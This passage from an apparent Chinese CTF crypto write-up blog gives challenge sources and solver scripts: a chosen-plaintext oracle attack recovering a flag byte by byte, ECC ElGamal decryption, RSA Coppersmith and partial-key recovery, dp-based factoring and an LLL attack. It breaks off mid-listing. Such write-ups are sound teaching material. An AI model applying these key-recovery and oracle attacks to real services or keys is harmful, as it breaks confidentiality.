class="hljs-keyword">break</span><br>    lenth = lenth//<span class="hljs-number">2</span>-<span class="hljs-built_in">len</span>(send_data)+<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;lenth=&quot;</span>, lenth)<br><br>    <span class="hljs-comment">#爆破flag</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lenth):<br>        send_data = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">31</span> - i)<br>        conn.sendline(<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>        conn.sendline(send_data)<br><br>        conn.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>        ct = conn.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ct=&quot;</span>, ct)<br><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;j=&quot;</span>, j.encode())<br>            send_data = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">31</span> - i) + flag.encode() + j.encode()<br>            conn.sendline(<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>            conn.sendline(send_data)<br>            conn.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>            ct2 = conn.recvline()[:-<span class="hljs-number">1</span>]<br><br>            <span class="hljs-keyword">if</span> ct2[:<span class="hljs-number">64</span>] == ct[:<span class="hljs-number">64</span>]:<br>                <span class="hljs-comment">#print(&quot;ct2=&quot;, ct2)</span><br>                <span class="hljs-comment">#print(&quot;ct=&quot;, ct)</span><br>                flag = flag + j<br><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag=&quot;</span>, flag)<br>                <span class="hljs-keyword">break</span><br><br>    <br>    <span class="hljs-keyword">return</span> flag<br><br>flag = attack()<br></code></pre></td></tr></table></figure><h1 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = getPrime(<span class="hljs-number">256</span>)<br>a = getPrime(<span class="hljs-number">256</span>)<br>b = getPrime(<span class="hljs-number">256</span>)<br>E = EllipticCurve(GF(p),[a,b])<br>m = E.random_point()<br>G = E.random_point()<br>k = getPrime(<span class="hljs-number">256</span>)<br>K = k * G<br>r = getPrime(<span class="hljs-number">256</span>)<br>c1 = m + r * K<br>c2 = r * G<br><br>cipher_left = bytes_to_long(flag[:<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>]) * m[<span class="hljs-number">0</span>]<br>cipher_right = bytes_to_long(flag[<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>:]) * m[<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;a = <span class="hljs-subst">&#123;a&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;b = <span class="hljs-subst">&#123;b&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;k = <span class="hljs-subst">&#123;k&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;E = <span class="hljs-subst">&#123;E&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c1 = <span class="hljs-subst">&#123;c1&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c2 = <span class="hljs-subst">&#123;c2&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;cipher_left = <span class="hljs-subst">&#123;cipher_left&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;cipher_right = <span class="hljs-subst">&#123;cipher_right&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 93202687891394085633786409619308940289806301885603002539703165565954917915237</span><br><span class="hljs-string">a = 93822086754590882682502837744000915992590989006575416134628106376590825652793</span><br><span class="hljs-string">b = 80546187587527518012258369984400999843218609481640396827119274116524742672463</span><br><span class="hljs-string">k = 58946963503925758614502522844777257459612909354227999110879446485128547020161</span><br><span class="hljs-string">E = Elliptic Curve defined by y^2 = x^3 + 619398863196797048716428124691975702784687120972413594924940810635907737556*x + 80546187587527518012258369984400999843218609481640396827119274116524742672463 over Finite Field of size 93202687891394085633786409619308940289806301885603002539703165565954917915237</span><br><span class="hljs-string">c1 = (40485287784577105052142632380297282223290388901294496494726004092953216846111 : 81688798450940847410572480357702533480504451191937977779652402489509511335169 : 1)</span><br><span class="hljs-string">c2 = (51588540344302003527882762117190244240363885481651104291377049503085003152858 : 77333747801859674540077067783932976850711668089918703995609977466893496793359 : 1)</span><br><span class="hljs-string">cipher_left = 34210996654599605871773958201517275601830496965429751344560373676881990711573</span><br><span class="hljs-string">cipher_right = 62166121351090454316858010748966403510891793374784456622783974987056684617905</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = <span class="hljs-number">93202687891394085633786409619308940289806301885603002539703165565954917915237</span><br>a = <span class="hljs-number">93822086754590882682502837744000915992590989006575416134628106376590825652793</span><br>b = <span class="hljs-number">80546187587527518012258369984400999843218609481640396827119274116524742672463</span><br>k = <span class="hljs-number">58946963503925758614502522844777257459612909354227999110879446485128547020161</span><br><br>E = EllipticCurve(GF(p), [a, b])<br><br>c1 = E(<br>    <span class="hljs-number">40485287784577105052142632380297282223290388901294496494726004092953216846111</span>,<br>    <span class="hljs-number">81688798450940847410572480357702533480504451191937977779652402489509511335169</span><br>)<br>c2 = E(<br>    <span class="hljs-number">51588540344302003527882762117190244240363885481651104291377049503085003152858</span>,<br>    <span class="hljs-number">77333747801859674540077067783932976850711668089918703995609977466893496793359</span><br>)<br>cipher_left = <span class="hljs-number">34210996654599605871773958201517275601830496965429751344560373676881990711573</span><br>cipher_right = <span class="hljs-number">62166121351090454316858010748966403510891793374784456622783974987056684617905</span><br><br>m = c1 - k * c2<br>m_x = <span class="hljs-built_in">int</span>(m[<span class="hljs-number">0</span>])<br>m_y = <span class="hljs-built_in">int</span>(m[<span class="hljs-number">1</span>])<br>m0 = inverse(m_x, p)<br>m1 = inverse(m_y, p)<br>ans0 = long_to_bytes((cipher_left * m0) % p)<br>ans1 = long_to_bytes((cipher_right * m1) % p)<br><span class="hljs-built_in">print</span>(ans0 + ans1)<br></code></pre></td></tr></table></figure><h1 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><span class="hljs-keyword">assert</span> m.bit_length()&lt;<span class="hljs-number">500</span><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br>bits = <span class="hljs-number">150</span><br>m = (m &gt;&gt; bits) &lt;&lt; bits<br>h = (<span class="hljs-number">2024</span>*m-<span class="hljs-number">2023</span>) % n<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;h =&#x27;</span>,h)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span><br><span class="hljs-string">c = 9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span><br><span class="hljs-string">h = 111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes<br><br>n = <span class="hljs-number">98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span><br>c = <span class="hljs-number">9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span><br>h = <span class="hljs-number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span><br>e = <span class="hljs-number">3</span><br>bits = <span class="hljs-number">150</span><br><br>m = (h + <span class="hljs-number">2023</span>)*inverse(<span class="hljs-number">2024</span>, n) % n<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;m = <span class="hljs-subst">&#123;m&#125;</span>&quot;</span>)<br><br>P.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = (m+x)^e - c<br>roots = f.small_roots()[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> roots:<br>    ans = long_to_bytes(<span class="hljs-built_in">int</span>(m+roots))<br>    <span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="highlow"><a href="#highlow" class="headerlink" title="highlow"></a>highlow</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e = <span class="hljs-number">65537</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>pxor = p ^ (bytes_to_long(flag)&lt;&lt;<span class="hljs-number">400</span>)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)== <span class="hljs-number">44</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pxor =&#x27;</span>,pxor)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c = 11017336122691034053241992293963114590816319844384287448629663672049205892828600396465505710922907685545939978376321927394655458727494361852952898280905220963163625482295222856129164172619564344634365520328815972232825639292605311741655988427166811406091329613627961070231457035303298793651546412496975662225857123805867756651901374507447803198638466304862480202099076813471571495380132563252630789218173007275890600746758285415274434393381125742526014986039652677605642226576741424053749512280825231217420239089105794080707322357602941046822659335487420672699022969372037662958497832065752272061853723653365171768556</span><br><span class="hljs-string">n = 14091206320622523674847720139761543154822190879035380245424481267482550932229611965964424965958386255076593911062804299275581742665134207390532802109700225140999812698020838683697375891035625255222001884477214361835101442288725383073334392995186053867261497679234362794914108033574681292656522807928680812726462195077833184018122369579002715900477290345396065912536529290811962117814900448319776590712946259540382461632468634827959957286905806432005632864663985014872365672653476822833921870071851313424903481282350342304819149894610089804321405589433980650340610521659031234826823369114800150883988613877877881069579</span><br><span class="hljs-string">pxor = 124229245244085791439650934438639686782423445183921252684721764061493908790073948877623812930339081158169421854801552819088679937157357924845248082716160727839419054107753000815066526032809275137495740454967765165248115412626716101315676902716808647904092798908601183908297141420793614426863816161203796966951</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>pxor = <span class="hljs-number">124229245244085791439650934438639686782423445183921252684721764061493908790073948877623812930339081158169421854801552819088679937157357924845248082716160727839419054107753000815066526032809275137495740454967765165248115412626716101315676902716808647904092798908601183908297141420793614426863816161203796966951</span><br>c = <span class="hljs-number">11017336122691034053241992293963114590816319844384287448629663672049205892828600396465505710922907685545939978376321927394655458727494361852952898280905220963163625482295222856129164172619564344634365520328815972232825639292605311741655988427166811406091329613627961070231457035303298793651546412496975662225857123805867756651901374507447803198638466304862480202099076813471571495380132563252630789218173007275890600746758285415274434393381125742526014986039652677605642226576741424053749512280825231217420239089105794080707322357602941046822659335487420672699022969372037662958497832065752272061853723653365171768556</span><br>n = <span class="hljs-number">14091206320622523674847720139761543154822190879035380245424481267482550932229611965964424965958386255076593911062804299275581742665134207390532802109700225140999812698020838683697375891035625255222001884477214361835101442288725383073334392995186053867261497679234362794914108033574681292656522807928680812726462195077833184018122369579002715900477290345396065912536529290811962117814900448319776590712946259540382461632468634827959957286905806432005632864663985014872365672653476822833921870071851313424903481282350342304819149894610089804321405589433980650340610521659031234826823369114800150883988613877877881069579</span><br>e = <span class="hljs-number">65537</span><br><br>p_low = pxor &amp; (<span class="hljs-number">2</span>^<span class="hljs-number">400</span> - <span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(p_low)<br>fbits = <span class="hljs-number">44</span>*<span class="hljs-number">8</span><br>kbits = <span class="hljs-number">400</span> + fbits<br><span class="hljs-built_in">print</span>(kbits)<br><br>p_high = (pxor &gt;&gt; kbits) &lt;&lt; kbits<br><span class="hljs-built_in">print</span>(p_high)<br><br>P.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = p_high + x * <span class="hljs-number">2</span>^<span class="hljs-number">400</span> + p_low<br>f = f.monic()<br>root = f.small_roots(X=<span class="hljs-number">2</span>^fbits,beta=<span class="hljs-number">0.44</span>)[<span class="hljs-number">0</span>]<br>p = p_high + <span class="hljs-built_in">int</span>(root)*<span class="hljs-number">2</span>^<span class="hljs-number">400</span> + p_low <br>q = n//p<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="inPEM"><a href="#inPEM" class="headerlink" title="inPEM"></a>inPEM</h1><p><strong>分析：</strong><br>可以通过不完整的私钥文件得到dp，dq，具体原理可参考我的另一篇文章<a href="https://ramoor.github.io/2025/07/03/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-PEM%E6%96%87%E4%BB%B6/">Crypto基础篇-PEM文件 - Ramoor</a></p><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes,bytes_to_long<br><br>dp = <span class="hljs-string">&quot;00 ba 5b ea f3 82 f5 86 bf 04 46 15 f3 ec 8b f3 5e 0a d0 a4 1c ec b2 13 93 0a 86 ac 35 a8 0d 90 31 9a 05 aa 56 da 31 1e e8 43 5a be 63 17 eb 6d 15 90 4f c7 87 d3 7b 34 c4 8d aa d7 5d 2b 77 a4 1d 5c ec 4c 27 cc ed 07 cb da 89 1f ef a0 d9 d7 02 50 23 bc b8 65 c1 6c 00 02 66 a0 90 64 00 32 75 2a cc e7 3a 33 58 06 0c 05 67 23 e7 88 f4 2e dc 8e 12 0e 0f 58 f5 e2 4f 32 7f ff 1c 56 68 7f b1&quot;</span><br>dq = <span class="hljs-string">&quot;a1 46 44 8c 98 0f cf 49 be 56 40 ea 8c fb 62 78 f3 b2 70 e5 4e ad 35 b5 dd f6 5c 0b b0 eb 67 59 40 75 a6 83 59 e9 0b 76 2d cc 59 60 4f 23 58 d9 07 a5 39 b9 ab cb 27 36 bc 59 f1 56 14 d8 70 35 c5 2d 0c 2b 5f c5 f9 61 5e 00 ac 50 00 97 2c f1 a4 dc d8 3f 30 c7 ad da 8b 0f a3 e1 31 4f b0 46 e1 d5 3f 20 2d 34 1b 0b d0 df a6 81 07 2c 58 92 6f 9e 04 93 1e 0f 3a 90 93 a5 1e 53 6e 2c 11 a1&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">strings_trans</span>(<span class="hljs-params">strings</span>):<br>    strings=strings.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> strings<br><br>dp = <span class="hljs-built_in">int</span>(strings_trans(dp),<span class="hljs-number">16</span>)<br>dq = <span class="hljs-built_in">int</span>(strings_trans(dq),<span class="hljs-number">16</span>)<br>n = <span class="hljs-number">19909823107653171578063591352961144331355821517081529017694276790993397379180193511755806958091550033235815834847549265751244192211761569881061742997804509098095297146520946343734939782935970054031389390447526577982809412074573616889663964050032806967234869741452169276495048891650957729859124875343810181695665153129824527065062831773013713479602052423965588148263292672514853749647510938621421264137177666497737099263481269491867593812579958283619882699866915561357437484323854411934718569074869408000191465973545262527827064708529700071967884924505367105288433603597633451764659888020272057850625902629529400734213</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span><br><br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.enc&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>c = bytes_to_long(file.read())<br><br>x = e*dp - <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> x % i == <span class="hljs-number">0</span>:<br>        p_1 = x // i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> n % p_1 == <span class="hljs-number">0</span>:<br>            p = p_1<br>            q = n // p<br>            <span class="hljs-keyword">break</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="LLL"><a href="#LLL" class="headerlink" title="LLL"></a>LLL</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;******&#x27;</span><br>m = bytes_to_long(flag)<br><br><span class="hljs-keyword">assert</span> m.bit_length() == <span class="hljs-number">327</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>a = getPrime(<span class="hljs-number">1024</span>)<br>c = getPrime(<span class="hljs-number">400</span>)<br><br>b = (a*m + c) % p<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;a = <span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;b = <span class="hljs-subst">&#123;b&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">a = 169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span><br><span class="hljs-string">b = 87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span><br><span class="hljs-string">p = 131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes<br>a = <span class="hljs-number">169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span><br>b = <span class="hljs-number">87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span><br>p = <span class="hljs-number">131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span><br><br>m = matrix(ZZ ,[[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a],[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>^<span class="hljs-number">400</span>,b],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,p]])<br>L = m.LLL()[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(L[<span class="hljs-number">0</span>]))))<br></code></pre></td></tr></table></figure><h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 